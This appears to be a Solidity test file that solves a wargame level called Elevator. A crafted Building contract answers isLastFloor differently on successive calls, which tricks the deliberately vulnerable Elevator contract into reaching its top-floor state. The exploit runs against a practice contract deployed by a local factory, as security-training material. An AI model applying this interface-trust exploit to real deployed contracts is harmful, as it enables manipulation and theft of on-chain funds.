// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {ElevatorFactory} from "../src/levels/11-ElevatorFactory.sol";
import {Elevator, Building} from "../src/levels/11-Elevator.sol";

contract MyBuilding is Building {
    uint256 private callCount = 0;

    function isLastFloor(uint256) external returns (bool){
        return callCount++ > 0;
    }

    function goTo(Elevator elevator) external {
        elevator.goTo(420);
    }
}

contract ElevatorSolution is BaseTest {

    function solution(address payable target_) internal override{
        Elevator target = Elevator(target_);
        (new MyBuilding()).goTo(target);
    }

    function construction() internal override returns(address payable ) {
        return payable(address(new ElevatorFactory()));
    }
}
